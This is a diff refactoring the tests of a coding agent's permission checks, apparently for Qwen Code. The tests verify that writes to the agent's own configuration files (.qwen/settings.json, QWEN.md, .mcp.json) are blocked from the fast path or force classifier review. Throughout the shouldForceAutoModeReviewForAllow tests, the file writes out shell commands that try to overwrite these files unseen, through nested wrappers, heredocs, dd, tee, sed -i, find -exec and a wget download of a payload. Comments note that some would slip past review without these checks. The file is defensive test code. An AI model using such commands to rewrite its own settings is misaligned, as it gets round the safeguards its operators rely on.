@@ -33,6 +33,7 @@ import { ToolNames } from '../tools/tool-names.js';
 import type { Config } from '../config/config.js';
 import type { PermissionCheckContext } from './types.js';
 import { setMemoryFilename } from '../utils/memory-constants.js';
+import { userText } from '../test-utils/model-fixtures.js';
 
 //Mock classifier to ensure in workspace protected writes still reach it
 vi.mock('./classifier.js', () => ({
@@ -83,9 +84,9 @@ describe('SAFE_TOOL_ALLOWLIST', () => {
       // The bridge inherits the deferred target's safety classification and
       // must never bypass it as a safe wrapper.
       ToolNames.TOOL_CALL,
-      // `send_message` injects arbitrary text into another running agent
-      // as a new instruction — the classifier must see destination + body
-      // so it can detect inter-agent steering toward destructive actions.
+      // `send_message` injects arbitrary text into another running agent as a
+      // new instruction; the classifier must see destination + body to detect
+      // inter-agent steering toward destructive actions.
       ToolNames.SEND_MESSAGE,
     ];
     for (const tool of forbidden) {
@@ -138,10 +139,7 @@ describe('isInSafeToolAllowlist', () => {
 
 // ─── passesAcceptEditsFastPath ────────────────────────────────────────────
 
-/**
- * Build a stub Config whose WorkspaceContext considers `workspaceRoots`
- * as inside-the-workspace.
- */
+/** A stub Config whose WorkspaceContext treats `workspaceRoots` as inside. */
 function makeConfig(workspaceRoots: string[]): Config {
   return {
     getWorkspaceContext: () => ({
@@ -160,9 +158,39 @@ function ctx(over: Partial<PermissionCheckContext>): PermissionCheckContext {
   };
 }
 
+/** Runs `fn` in a fresh temp dir (removed afterwards). */
+function inTmpDir(prefix: string, fn: (tmpRoot: string) => void) {
+  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
+  try {
+    fn(tmpRoot);
+  } finally {
+    fs.rmSync(tmpRoot, { recursive: true, force: true });
+  }
+}
+
+/** Runs `fn`, then restores QWEN_HOME (deleting it if it was unset). */
+function restoringQwenHome(fn: () => void) {
+  const originalQwenHome = process.env['QWEN_HOME'];
+  try {
+    fn();
+  } finally {
+    if (originalQwenHome === undefined) {
+      delete process.env['QWEN_HOME'];
+    } else {
+      process.env['QWEN_HOME'] = originalQwenHome;
+    }
+  }
+}
+
 describe('isAutoModeProtectedWritePath', () => {
+  const expectProtected = (paths: string[], expected = true) => {
+    for (const filePath of paths) {
+      expect(isAutoModeProtectedWritePath(filePath)).toBe(expected);
+    }
+  };
+
   it('matches Qwen self-modification files and directories', () => {
-    const protectedPaths = [
+    expectProtected([
       '/repo/.qwen/settings.json',
       '/repo/.qwen/settings.local.json',
       '/repo/QWEN.md',
@@ -176,41 +204,32 @@ describe('isAutoModeProtectedWritePath', () => {
       '/repo/.qwen/rules/backend.md',
       '/repo/.mcp.json',
       '/repo/.git',
-    ];
-
-    for (const filePath of protectedPaths) {
-      expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
-    }
+    ]);
   });
 
   it('does not treat ordinary source files or worktree files as protected', () => {
-    const ordinaryPaths = [
-      '/repo/src/index.ts',
-      '/repo/.qwen/PROJECT_SUMMARY.md',
-      '/repo/.qwen/worktrees/feature/src/index.ts',
-    ];
-
-    for (const filePath of ordinaryPaths) {
-      expect(isAutoModeProtectedWritePath(filePath)).toBe(false);
-    }
+    expectProtected(
+      [
+        '/repo/src/index.ts',
+        '/repo/.qwen/PROJECT_SUMMARY.md',
+        '/repo/.qwen/worktrees/feature/src/index.ts',
+      ],
+      false,
+    );
   });
 
   it('still protects config surfaces inside managed worktrees', () => {
-    const protectedPaths = [
+    expectProtected([
       '/repo/.qwen/worktrees/feature/.qwen/settings.json',
       '/repo/.qwen/worktrees/feature/AGENTS.md',
       '/repo/.qwen/worktrees/feature/.qwen/QWEN.local.md',
       '/repo/.qwen/worktrees/feature/.qwen/rules/backend.md',
       '/repo/.qwen/worktrees/feature/.mcp.json',
-    ];
-
-    for (const filePath of protectedPaths) {
-      expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
-    }
+    ]);
   });
 
   it('matches protected paths case-insensitively', () => {
-    const protectedPaths = [
+    expectProtected([
       '/repo/qwen.md',
       '/repo/agents.md',
       '/repo/.QWEN/SETTINGS.JSON',
@@ -220,36 +239,26 @@ describe('isAutoModeProtectedWritePath', () => {
       '/repo/GNUmakefile',
       '/repo/Taskfile.yaml',
       '/repo/.Github/workflows/ci.yml',
-    ];
-
-    for (const filePath of protectedPaths) {
-      expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
-    }
+    ]);
   });
 
   it('matches configured context filenames', () => {
     setMemoryFilename(['CUSTOM_AGENTS.md', 'docs/TEAM_CONTEXT.md']);
     try {
-      const protectedPaths = [
+      expectProtected([
         '/repo/CUSTOM_AGENTS.md',
         '/repo/docs/TEAM_CONTEXT.md',
         '/repo/.qwen/worktrees/feature/CUSTOM_AGENTS.md',
-      ];
-
-      for (const filePath of protectedPaths) {
-        expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
-      }
+      ]);
     } finally {
       setMemoryFilename(['QWEN.md', 'AGENTS.md']);
     }
   });
 
   it('matches self-modification surfaces in custom QWEN_HOME', () => {
-    const originalQwenHome = process.env['QWEN_HOME'];
-    process.env['QWEN_HOME'] = '/tmp/custom-qwen-home';
-
-    try {
-      const protectedPaths = [
+    restoringQwenHome(() => {
+      process.env['QWEN_HOME'] = '/tmp/custom-qwen-home';
+      expectProtected([
         '/tmp/custom-qwen-home/settings.json',
         '/tmp/custom-qwen-home/settings.local.json',
         '/tmp/custom-qwen-home/QWEN.local.md',
@@ -260,49 +269,29 @@ describe('isAutoModeProtectedWritePath', () => {
         '/tmp/custom-qwen-home/fork-profiles/ro-research.md',
         '/tmp/custom-qwen-home/rules/backend.md',
         '/tmp/custom-qwen-home/.mcp.json',
-      ];
-
-      for (const filePath of protectedPaths) {
-        expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
-      }
-    } finally {
-      if (originalQwenHome === undefined) {
-        delete process.env['QWEN_HOME'];
-      } else {
-        process.env['QWEN_HOME'] = originalQwenHome;
-      }
-    }
+      ]);
+    });
   });
 
   it('matches real paths under a symlinked custom QWEN_HOME', () => {
-    const originalQwenHome = process.env['QWEN_HOME'];
-    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'qwen-home-'));
+    restoringQwenHome(() =>
+      inTmpDir('qwen-home-', (tmpRoot) => {
+        const realHome = path.join(tmpRoot, 'real-home');
+        const linkedHome = path.join(tmpRoot, 'linked-home');
+        fs.mkdirSync(realHome, { recursive: true });
+        fs.symlinkSync(realHome, linkedHome);
+        process.env['QWEN_HOME'] = linkedHome;
 
-    try {
-      const realHome = path.join(tmpRoot, 'real-home');
-      const linkedHome = path.join(tmpRoot, 'linked-home');
-      fs.mkdirSync(realHome, { recursive: true });
-      fs.symlinkSync(realHome, linkedHome);
-      process.env['QWEN_HOME'] = linkedHome;
+        const settingsPath = path.join(realHome, 'settings.json');
+        fs.writeFileSync(settingsPath, '{}');
 
-      const settingsPath = path.join(realHome, 'settings.json');
-      fs.writeFileSync(settingsPath, '{}');
-
-      expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
-    } finally {
-      if (originalQwenHome === undefined) {
-        delete process.env['QWEN_HOME'];
-      } else {
-        process.env['QWEN_HOME'] = originalQwenHome;
-      }
-      fs.rmSync(tmpRoot, { recursive: true, force: true });
-    }
+        expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
+      }),
+    );
   });
 
   it('re-resolves write paths after symlinks are created', () => {
-    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'qwen-write-path-'));
-
-    try {
+    inTmpDir('qwen-write-path-', (tmpRoot) => {
       const protectedDir = path.join(tmpRoot, '.qwen');
       const settingsPath = path.join(protectedDir, 'settings.json');
       const linkPath = path.join(tmpRoot, 'scratch');
@@ -314,58 +303,46 @@ describe('isAutoModeProtectedWritePath', () => {
       fs.symlinkSync(settingsPath, linkPath);
 
       expect(isAutoModeProtectedWritePath(linkPath)).toBe(true);
-    } finally {
-      fs.rmSync(tmpRoot, { recursive: true, force: true });
-    }
+    });
   });
 
   it('caches normalized QWEN_HOME prefixes per configured home', () => {
-    const originalQwenHome = process.env['QWEN_HOME'];
-    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'qwen-home-cache-'));
-    const realpathSpy = vi.spyOn(fs.realpathSync, 'native');
+    restoringQwenHome(() =>
+      inTmpDir('qwen-home-cache-', (tmpRoot) => {
+        const realpathSpy = vi.spyOn(fs.realpathSync, 'native');
+        try {
+          const settingsPath = path.join(tmpRoot, 'settings.json');
+          fs.writeFileSync(settingsPath, '{}');
+          process.env['QWEN_HOME'] = tmpRoot;
 
-    try {
-      const settingsPath = path.join(tmpRoot, 'settings.json');
-      fs.writeFileSync(settingsPath, '{}');
-      process.env['QWEN_HOME'] = tmpRoot;
-
-      expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
-      expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
-      expect(
-        realpathSpy.mock.calls.filter(([arg]) => arg === tmpRoot),
-      ).toHaveLength(1);
-    } finally {
-      realpathSpy.mockRestore();
-      if (originalQwenHome === undefined) {
-        delete process.env['QWEN_HOME'];
-      } else {
-        process.env['QWEN_HOME'] = originalQwenHome;
-      }
-      fs.rmSync(tmpRoot, { recursive: true, force: true });
-    }
+          expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
+          expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
+          expect(
+            realpathSpy.mock.calls.filter(([arg]) => arg === tmpRoot),
+          ).toHaveLength(1);
+        } finally {
+          realpathSpy.mockRestore();
+        }
+      }),
+    );
   });
 });
 
 describe('passesAcceptEditsFastPath', () => {
   const cwd = '/Users/test/project';
   const config = makeConfig([cwd]);
+  const fastPath = (
+    toolName: string,
+    filePath: string | undefined,
+    cfg = config,
+  ) => passesAcceptEditsFastPath(ctx({ toolName, filePath }), cfg);
 
   it('allows EDIT targeting a path inside cwd', () => {
-    expect(
-      passesAcceptEditsFastPath(
-        ctx({ toolName: ToolNames.EDIT, filePath: `${cwd}/src/foo.ts` }),
-        config,
-      ),
-    ).toBe(true);
+    expect(fastPath(ToolNames.EDIT, `${cwd}/src/foo.ts`)).toBe(true);
   });
 
   it('allows WRITE_FILE targeting a path inside cwd', () => {
-    expect(
-      passesAcceptEditsFastPath(
-        ctx({ toolName: ToolNames.WRITE_FILE, filePath: `${cwd}/x.ts` }),
-        config,
-      ),
-    ).toBe(true);
+    expect(fastPath(ToolNames.WRITE_FILE, `${cwd}/x.ts`)).toBe(true);
   });
 
   it('rejects Qwen self-modification paths even inside cwd', () => {
@@ -386,38 +363,24 @@ describe('passesAcceptEditsFastPath', () => {
 
     for (const toolName of [ToolNames.EDIT, ToolNames.WRITE_FILE]) {
       for (const filePath of protectedPaths) {
-        expect(
-          passesAcceptEditsFastPath(ctx({ toolName, filePath }), config),
-        ).toBe(false);
+        expect(fastPath(toolName, filePath)).toBe(false);
       }
     }
   });
 
   it('allows ordinary files under .qwen/worktrees but rejects nested config surfaces', () => {
-    expect(
-      passesAcceptEditsFastPath(
-        ctx({
-          toolName: ToolNames.WRITE_FILE,
-          filePath: `${cwd}/.qwen/worktrees/feature/src/index.ts`,
-        }),
-        config,
-      ),
-    ).toBe(true);
+    const worktree = `${cwd}/.qwen/worktrees/feature`;
+    expect(fastPath(ToolNames.WRITE_FILE, `${worktree}/src/index.ts`)).toBe(
+      true,
+    );
 
     expect(
-      passesAcceptEditsFastPath(
-        ctx({
-          toolName: ToolNames.WRITE_FILE,
-          filePath: `${cwd}/.qwen/worktrees/feature/.qwen/settings.json`,
-        }),
-        config,
-      ),
+      fastPath(ToolNames.WRITE_FILE, `${worktree}/.qwen/settings.json`),
     ).toBe(false);
   });
 
   it('rejects symlinks that resolve to protected self-modification paths', () => {
-    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'qwen-auto-mode-'));
-    try {
+    inTmpDir('qwen-auto-mode-', (tmpRoot) => {
       const qwenDir = path.join(tmpRoot, '.qwen');
       fs.mkdirSync(qwenDir, { recursive: true });
       const target = path.join(qwenDir, 'settings.json');
@@ -432,45 +395,22 @@ describe('passesAcceptEditsFastPath', () => {
         }),
       } as unknown as Config;
 
-      expect(
-        passesAcceptEditsFastPath(
-          ctx({ toolName: ToolNames.WRITE_FILE, filePath: link }),
-          cfg,
-        ),
-      ).toBe(false);
-    } finally {
-      fs.rmSync(tmpRoot, { recursive: true, force: true });
-    }
+      expect(fastPath(ToolNames.WRITE_FILE, link, cfg)).toBe(false);
+    });
   });
 
   it('rejects EDIT targeting a path outside the workspace', () => {
-    expect(
-      passesAcceptEditsFastPath(
-        ctx({
-          toolName: ToolNames.EDIT,
-          filePath: '/Users/test/other-project/x.ts',
-        }),
-        config,
-      ),
-    ).toBe(false);
+    expect(fastPath(ToolNames.EDIT, '/Users/test/other-project/x.ts')).toBe(
+      false,
+    );
   });
 
   it('rejects WRITE_FILE targeting /etc/hosts', () => {
-    expect(
-      passesAcceptEditsFastPath(
-        ctx({ toolName: ToolNames.WRITE_FILE, filePath: '/etc/hosts' }),
-        config,
-      ),
-    ).toBe(false);
+    expect(fastPath(ToolNames.WRITE_FILE, '/etc/hosts')).toBe(false);
   });
 
   it('rejects when filePath is missing', () => {
-    expect(
-      passesAcceptEditsFastPath(
-        ctx({ toolName: ToolNames.EDIT, filePath: undefined }),
-        config,
-      ),
-    ).toBe(false);
+    expect(fastPath(ToolNames.EDIT, undefined)).toBe(false);
   });
 
   it('rejects non-edit tools (SHELL)', () => {
@@ -487,37 +427,20 @@ describe('passesAcceptEditsFastPath', () => {
   });
 
   it('rejects allowlisted read-only tools', () => {
-    expect(
-      passesAcceptEditsFastPath(
-        ctx({ toolName: ToolNames.READ_FILE, filePath: `${cwd}/x.ts` }),
-        config,
-      ),
-    ).toBe(false);
+    expect(fastPath(ToolNames.READ_FILE, `${cwd}/x.ts`)).toBe(false);
   });
 
   it('respects additional workspace roots', () => {
     const cfg = makeConfig([cwd, '/Users/test/extra-dir']);
     expect(
-      passesAcceptEditsFastPath(
-        ctx({
-          toolName: ToolNames.EDIT,
-          filePath: '/Users/test/extra-dir/sub/file.ts',
-        }),
-        cfg,
-      ),
+      fastPath(ToolNames.EDIT, '/Users/test/extra-dir/sub/file.ts', cfg),
     ).toBe(true);
   });
 
   it('does not match prefix-collision paths (e.g. /project vs /project-other)', () => {
-    expect(
-      passesAcceptEditsFastPath(
-        ctx({
-          toolName: ToolNames.EDIT,
-          filePath: '/Users/test/project-other/x.ts',
-        }),
-        config,
-      ),
-    ).toBe(false);
+    expect(fastPath(ToolNames.EDIT, '/Users/test/project-other/x.ts')).toBe(
+      false,
+    );
   });
 
   it('calls workspace context isPathWithinWorkspace for the actual path check', () => {
@@ -525,267 +448,132 @@ describe('passesAcceptEditsFastPath', () => {
     const cfg = {
       getWorkspaceContext: () => ({ isPathWithinWorkspace: fn }),
     } as unknown as Config;
-    passesAcceptEditsFastPath(
-      ctx({ toolName: ToolNames.EDIT, filePath: '/some/path/x.ts' }),
-      cfg,
-    );
+    fastPath(ToolNames.EDIT, '/some/path/x.ts', cfg);
     expect(fn).toHaveBeenCalledWith('/some/path/x.ts');
   });
 });
 
 describe('shouldForceAutoModeReviewForAllow', () => {
+  /** `command` run through `toolName` (default Shell) from /repo. */
+  const forcesReview = (command: string, toolName: string = ToolNames.SHELL) =>
+    shouldForceAutoModeReviewForAllow(ctx({ toolName, command, cwd: '/repo' }));
+  const forcesReviewOf = (toolName: string, filePath: string) =>
+    shouldForceAutoModeReviewForAllow(ctx({ toolName, filePath }));
+  const heredoc = (body: string) =>
+    ["bash <<'SCRIPT'", body, 'SCRIPT'].join('\n');
+
   it('returns true for Edit/Write targeting protected self-modification paths', () => {
     expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.EDIT,
-          filePath: '/Users/test/.qwen/settings.json',
-        }),
-      ),
+      forcesReviewOf(ToolNames.EDIT, '/Users/test/.qwen/settings.json'),
     ).toBe(true);
 
     expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.WRITE_FILE,
-          filePath: '/repo/.qwen/QWEN.local.md',
-        }),
-      ),
+      forcesReviewOf(ToolNames.WRITE_FILE, '/repo/.qwen/QWEN.local.md'),
     ).toBe(true);
 
     expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.NOTEBOOK_EDIT,
-          filePath: '/repo/.qwen/skills/review/demo.ipynb',
-        }),
+      forcesReviewOf(
+        ToolNames.NOTEBOOK_EDIT,
+        '/repo/.qwen/skills/review/demo.ipynb',
       ),
     ).toBe(true);
   });
 
   it('returns true for shell-like commands writing protected paths', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'echo "{}" > .qwen/settings.json',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('echo "{}" > .qwen/settings.json')).toBe(true);
 
     expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.MONITOR,
-          command: 'bash -lc \'echo "{}" > .qwen/settings.json\'',
-          cwd: '/repo',
-        }),
+      forcesReview(
+        'bash -lc \'echo "{}" > .qwen/settings.json\'',
+        ToolNames.MONITOR,
       ),
     ).toBe(true);
   });
 
   it('returns true for nested wrappers writing protected paths after `cd`', () => {
     // Regression guard: without `extractShellOperationsAcrossCommand` doing
-    // cross-segment cd tracking AND recursive wrapper unwrapping, this
-    // exact payload would slip past AUTO force-review. A user
-    // `permissions.allow: ["Bash(*)"]` rule plus this command would have
-    // silently overwritten settings.json.
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: "cd .qwen && bash -lc 'echo {} > settings.json'",
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    // cross-segment cd tracking AND recursive wrapper unwrapping, this payload
+    // would slip past AUTO force-review, and a `permissions.allow: ["Bash(*)"]`
+    // rule plus this command would silently overwrite settings.json.
+    expect(forcesReview("cd .qwen && bash -lc 'echo {} > settings.json'")).toBe(
+      true,
+    );
   });
 
   it('returns true for relative writes after an unresolved dynamic `cd`', () => {
     // If cwd is dynamic, the apparent resolved path is only a guess. Route
     // back to the classifier so an allow rule cannot hide writes like
     // `cd "$QWEN_HOME" && echo > settings.json`.
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'cd "$QWEN_HOME" && echo "{}" > settings.json',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('cd "$QWEN_HOME" && echo "{}" > settings.json')).toBe(
+      true,
+    );
   });
 
   it('returns false for ordinary writes after `cd` into project subdirs', () => {
-    // Counter-case for the cd-tracking check above: cd-into-src + write a
-    // generated file should NOT force AUTO review. Otherwise every
-    // workspace-internal compound shell command would round-trip through
-    // the classifier and dilute the policy boundary's signal.
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: "cd src && bash -lc 'echo ok > generated.txt'",
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(false);
+    // Counter-case for the cd-tracking check: cd-into-src + write a generated
+    // file must NOT force review, or every workspace-internal compound command
+    // would round-trip through the classifier and dilute its signal.
+    expect(forcesReview("cd src && bash -lc 'echo ok > generated.txt'")).toBe(
+      false,
+    );
   });
 
   it('returns true for shell-like commands writing protected paths after cd', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'cd .qwen && echo "{}" > settings.json',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('cd .qwen && echo "{}" > settings.json')).toBe(true);
 
     expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.MONITOR,
-          command: 'bash -lc \'cd .qwen && echo "{}" > settings.json\'',
-          cwd: '/repo',
-        }),
+      forcesReview(
+        'bash -lc \'cd .qwen && echo "{}" > settings.json\'',
+        ToolNames.MONITOR,
       ),
     ).toBe(true);
   });
 
   it('returns true for protected writes in sibling segments after shell wrappers', () => {
     expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: "bash -lc 'echo ok' && echo hi > .qwen/settings.json",
-          cwd: '/repo',
-        }),
-      ),
+      forcesReview("bash -lc 'echo ok' && echo hi > .qwen/settings.json"),
     ).toBe(true);
   });
 
   it('returns true for newline-separated protected shell writes after cd', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'cd .qwen\ncp /tmp/malicious settings.json',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('cd .qwen\ncp /tmp/malicious settings.json')).toBe(
+      true,
+    );
   });
 
   it('returns true for grouped and metacharacter-suffixed protected writes', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: "{ cd .qwen && echo '{}' > settings.json; }",
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview("{ cd .qwen && echo '{}' > settings.json; }")).toBe(
+      true,
+    );
 
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: '(echo > .qwen/settings.json)',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('(echo > .qwen/settings.json)')).toBe(true);
   });
 
   it('returns true for protected writes embedded in shell heredoc bodies', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: [
-            "bash <<'SCRIPT'",
-            "echo '{}' > .qwen/settings.json",
-            'SCRIPT',
-          ].join('\n'),
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview(heredoc("echo '{}' > .qwen/settings.json"))).toBe(true);
   });
 
   it('returns true for protected write commands embedded in heredoc bodies', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: [
-            "bash <<'SCRIPT'",
-            'cp /tmp/payload .qwen/settings.json',
-            'SCRIPT',
-          ].join('\n'),
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview(heredoc('cp /tmp/payload .qwen/settings.json'))).toBe(
+      true,
+    );
 
-    for (const command of [
-      ["bash <<'SCRIPT'", "tee .qwen/settings.json <<< '{}'", 'SCRIPT'].join(
-        '\n',
-      ),
-      [
-        "bash <<'SCRIPT'",
-        'dd if=/tmp/payload of=.qwen/settings.json',
-        'SCRIPT',
-      ].join('\n'),
-      [
-        "bash <<'SCRIPT'",
-        'sort -o .qwen/settings.json /dev/null',
-        'SCRIPT',
-      ].join('\n'),
-      [
-        "bash <<'SCRIPT'",
-        "node -e \"require('fs').writeFileSync('.qwen/settings.json', '{}')\"",
-        'SCRIPT',
-      ].join('\n'),
+    for (const body of [
+      "tee .qwen/settings.json <<< '{}'",
+      'dd if=/tmp/payload of=.qwen/settings.json',
+      'sort -o .qwen/settings.json /dev/null',
+      "node -e \"require('fs').writeFileSync('.qwen/settings.json', '{}')\"",
     ]) {
-      expect(
-        shouldForceAutoModeReviewForAllow(
-          ctx({
-            toolName: ToolNames.SHELL,
-            command,
-            cwd: '/repo',
-          }),
-        ),
-      ).toBe(true);
+      expect(forcesReview(heredoc(body))).toBe(true);
     }
   });
 
   it('returns true for protected write commands with variable destinations', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'D=.qwen/settings.json; cp payload "$D"',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('D=.qwen/settings.json; cp payload "$D"')).toBe(true);
   });
 
   it('does not force review for awk field references', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: "awk '{print $1}' data.csv",
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(false);
+    expect(forcesReview("awk '{print $1}' data.csv")).toBe(false);
   });
 
   it('returns true for awk in-place edits to protected paths', () => {
@@ -793,15 +581,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       'awk -i inplace \'{gsub(/x/, "y")}1\' .qwen/settings.json',
       'gawk -i inplace \'{gsub(/x/, "y")}1\' .qwen/settings.json',
     ]) {
-      expect(
-        shouldForceAutoModeReviewForAllow(
-          ctx({
-            toolName: ToolNames.SHELL,
-            command,
-            cwd: '/repo',
-          }),
-        ),
-      ).toBe(true);
+      expect(forcesReview(command)).toBe(true);
     }
   });
 
@@ -810,32 +590,14 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       'sort -o .qwen/settings.json /dev/null',
       'sort --output=.qwen/settings.json /dev/null',
     ]) {
-      expect(
-        shouldForceAutoModeReviewForAllow(
-          ctx({
-            toolName: ToolNames.SHELL,
-            command,
-            cwd: '/repo',
-          }),
-        ),
-      ).toBe(true);
+      expect(forcesReview(command)).toBe(true);
     }
   });
 
   it('returns true for protected heredoc redirects with repeated quote tokens', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: [
-            "bash <<'SCRIPT'",
-            'echo "{}" > """.qwen/settings.json"""',
-            'SCRIPT',
-          ].join('\n'),
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview(heredoc('echo "{}" > """.qwen/settings.json"""'))).toBe(
+      true,
+    );
   });
 
   it('returns true for protected clobber and fd redirects', () => {
@@ -843,52 +605,20 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       "echo '{}' >| .qwen/settings.json",
       "echo '{}' >& .qwen/settings.json",
     ]) {
-      expect(
-        shouldForceAutoModeReviewForAllow(
-          ctx({
-            toolName: ToolNames.SHELL,
-            command,
-            cwd: '/repo',
-          }),
-        ),
-      ).toBe(true);
+      expect(forcesReview(command)).toBe(true);
     }
   });
 
   it('returns true for ANSI-C quoted protected redirect targets', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: "echo '{}' > $'.qwen/settings.json'",
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview("echo '{}' > $'.qwen/settings.json'")).toBe(true);
   });
 
   it('returns true for bidirectional redirects to protected paths', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'cat <> .qwen/settings.json',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('cat <> .qwen/settings.json')).toBe(true);
   });
 
   it('returns true for target-directory writes to protected filenames', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'cp -t .qwen /tmp/settings.json',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('cp -t .qwen /tmp/settings.json')).toBe(true);
   });
 
   it('returns true for downloader output flags targeting protected paths', () => {
@@ -898,15 +628,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       'wget -O .qwen/settings.json https://example.com/payload',
       'wget -O.qwen/settings.json https://example.com/payload',
     ]) {
-      expect(
-        shouldForceAutoModeReviewForAllow(
-          ctx({
-            toolName: ToolNames.SHELL,
-            command,
-            cwd: '/repo',
-          }),
-        ),
-      ).toBe(true);
+      expect(forcesReview(command)).toBe(true);
     }
   });
 
@@ -920,15 +642,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       'cpio -i -D .qwen/skills',
       'cpio -i -D.qwen/skills',
     ]) {
-      expect(
-        shouldForceAutoModeReviewForAllow(
-          ctx({
-            toolName: ToolNames.SHELL,
-            command,
-            cwd: '/repo',
-          }),
-        ),
-      ).toBe(true);
+      expect(forcesReview(command)).toBe(true);
     }
   });
 
@@ -937,40 +651,18 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       'patch --output=.qwen/settings.json -i fix.patch',
       'patch -o.qwen/settings.json -i fix.patch',
     ]) {
-      expect(
-        shouldForceAutoModeReviewForAllow(
-          ctx({
-            toolName: ToolNames.SHELL,
-            command,
-            cwd: '/repo',
-          }),
-        ),
-      ).toBe(true);
+      expect(forcesReview(command)).toBe(true);
     }
   });
 
   it('returns true for find exec writes with placeholder operands', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'find . -exec cp {} .qwen/settings.json ;',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('find . -exec cp {} .qwen/settings.json ;')).toBe(true);
   });
 
   it('returns true for find execdir writes with placeholder operands', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'find . -execdir cp {} .qwen/settings.json ;',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(true);
+    expect(forcesReview('find . -execdir cp {} .qwen/settings.json ;')).toBe(
+      true,
+    );
   });
 
   it('returns true for long in-place sed/perl writes to protected paths', () => {
@@ -979,15 +671,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       "sed --in-place=.bak 's/x/y/' .qwen/settings.json",
       "perl --in-place -e 's/x/y/' .qwen/settings.json",
     ]) {
-      expect(
-        shouldForceAutoModeReviewForAllow(
-          ctx({
-            toolName: ToolNames.SHELL,
-            command,
-            cwd: '/repo',
-          }),
-        ),
-      ).toBe(true);
+      expect(forcesReview(command)).toBe(true);
     }
   });
 
